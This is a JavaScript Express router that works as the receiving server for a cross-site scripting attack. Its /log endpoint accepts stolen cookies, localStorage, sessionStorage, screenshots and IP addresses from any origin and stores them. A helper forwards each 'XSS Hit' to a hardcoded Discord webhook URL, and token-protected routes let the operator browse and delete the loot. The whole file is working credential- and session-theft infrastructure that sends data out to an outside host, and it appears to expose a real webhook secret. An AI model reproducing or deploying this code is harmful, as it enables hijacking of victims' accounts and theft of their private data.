import express from 'express';
import db from './db.js';
import { verifyToken } from './auth.js';

const router = express.Router();

const DISCORD_WEBHOOK_URL = 'https://canary.discord.com/api/webhooks/1496538275501052096/5jELfvLHzKm5Lw3HftVWaf3GA40TuetDEkInqnohN0bol9TT-S5UWRX10fsWtwGeo4Fp'; // Coloque sua webhook do Discord aqui (opcional)

// ─── POST /log ────────────────────────────────────────────────────────────────
router.options('/log', (_req, res) => {
  res.set({
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type',
  }).status(204).send();
});

router.post('/log', async (req, res) => {
  res.set({
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type',
  });

  try {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
    const { url, cookies, userAgent, localStorage: ls, sessionStorage: ss, screenshot } = req.body;

    db.run(
      `INSERT INTO logs (url, cookies, ip, user_agent, local_storage, session_storage, screenshot, created_at)
       VALUES (?, ?, ?, ?, ?, ?, ?, ?)`,
      [url || '', cookies || '', ip, userAgent || '', ls || '{}', ss || '{}', screenshot || '', Date.now()],
      (err) => { if (err) console.error('Erro ao salvar log:', err); }
    );

    if (DISCORD_WEBHOOK_URL) {
      sendToDiscord({ url, cookies, userAgent, ls, ss, screenshot, ip }).catch(e => console.error('Discord:', e));
    }

    res.status(200).send();
  } catch (e) {
    console.error('Erro no /log:', e);
    res.status(500).send();
  }
});

// ─── GET /logs ────────────────────────────────────────────────────────────────
router.get('/logs', (req, res) => {
  const token = (req.headers.authorization || '').split(' ')[1];
  if (!verifyToken(token)) return res.status(401).json({ error: 'Token inválido' });

  const search = req.query.search || '';
  const offset = ((parseInt(req.query.page) || 1) - 1) * 20;

  const where = search ? `WHERE url LIKE ?` : '';
  const baseParams = search ? [`%${search}%`] : [];

  db.get(`SELECT COUNT(*) as total FROM logs ${where}`, baseParams, (err, countRow) => {
    if (err) return res.status(500).json({ error: err.message });
    db.all(
      `SELECT id, url, cookies, ip, user_agent, local_storage, session_storage, created_at FROM logs ${where} ORDER BY created_at DESC LIMIT 20 OFFSET ?`,
      [...baseParams, offset],
      (err, rows) => {
        if (err) return res.status(500).json({ error: err.message });
        res.json({ total: countRow.total, logs: rows });
      }
    );
  });
});

// ─── DELETE /logs/:id ─────────────────────────────────────────────────────────
router.delete('/logs/:id', (req, res) => {
  const token = (req.headers.authorization || '').split(' ')[1];
  if (!verifyToken(token)) return res.status(401).json({ error: 'Token inválido' });

  db.run('DELETE FROM logs WHERE id = ?', [req.params.id], (err) => {
    if (err) return res.status(500).json({ error: err.message });
    res.json({ success: true });
  });
});

// ─── Discord helper ───────────────────────────────────────────────────────────
async function sendToDiscord({ url, cookies, userAgent, ls, ss, screenshot, ip }) {
  const fields = [];
  if (cookies) fields.push({ name: 'Cookies', value: String(cookies).substring(0, 1020), inline: false });
  if (ls && ls !== '{}') fields.push({ name: 'LocalStorage', value: '```json\n' + String(ls).substring(0, 1000) + '\n```', inline: false });
  if (ss && ss !== '{}') fields.push({ name: 'SessionStorage', value: '```json\n' + String(ss).substring(0, 1000) + '\n```', inline: false });

  const embed = {
    title: `XSS Hit`,
    description: `**URL:** ${String(url || 'N/A').substring(0, 1000)}\n**IP:** ${ip || 'N/A'}\n**UA:** ${String(userAgent || 'N/A').substring(0, 300)}`,
    fields: fields.length ? fields : [{ name: 'Info', value: 'Sem dados adicionais', inline: false }],
    color: 0x4caf50,
    timestamp: new Date().toISOString(),
  };

  const formData = new FormData();
  if (screenshot?.startsWith('data:')) {
    try {
      const blob = await (await fetch(screenshot)).blob();
      formData.append('file', blob, 'screenshot.png');
      embed.image = { url: 'attachment://screenshot.png' };
    } catch (e) {}
  }
  formData.append('payload_json', JSON.stringify({ embeds: [embed] }));

  const r = await fetch(DISCORD_WEBHOOK_URL, { method: 'POST', body: formData });
  if (!r.ok) throw new Error(`Discord error: ${r.status}`);
}

export default router;
